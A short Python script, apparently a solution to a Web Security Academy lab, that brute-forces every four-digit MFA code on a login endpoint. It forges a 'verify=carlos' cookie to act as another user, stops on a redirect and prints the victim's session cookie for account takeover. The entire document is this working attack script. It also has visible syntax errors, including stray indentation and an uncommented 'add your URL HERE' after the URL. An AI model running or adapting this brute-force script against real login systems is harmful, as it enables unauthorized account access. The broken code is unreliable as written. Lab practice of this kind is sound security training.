

"""
Note: 
1- must change it first from burp to confirm carlos for your session

"""

import requests

url = "https://0a3d09980397b34000f0046.web-security-academy.net/login2"      add your URL HERE

 session = requests.Session()

your_session=""                 # add your session value HERE
 session.cookies.set("session", your_session)
session.cookies.set("verify", "carlos")

headers = {
    "User-Agent": "my_broswer version :) ",
    "Referer": url,
    "Content-Type": "application/x-www-form-urlencoded",
}

 for code in range(10000):
    code_str = f"{code:04}"   
    data = {"mfa-code": code_str}

    response = session.post(url, headers=headers, data=data, allow_redirects=False)  # make allow_redir is false to privent 200 OK and show if it redir with 3xx

    if response.status_code == 302:
        print(f"[+] FOUND CODE: {code_str}")
        print("Set-Cookie:", response.headers.get("Set-Cookie"))                 # add this cookie in  /my-account?id=carlos  end-point to access carlos's page
        break
    else:
        print(f"[-] Tried: {code_str}")
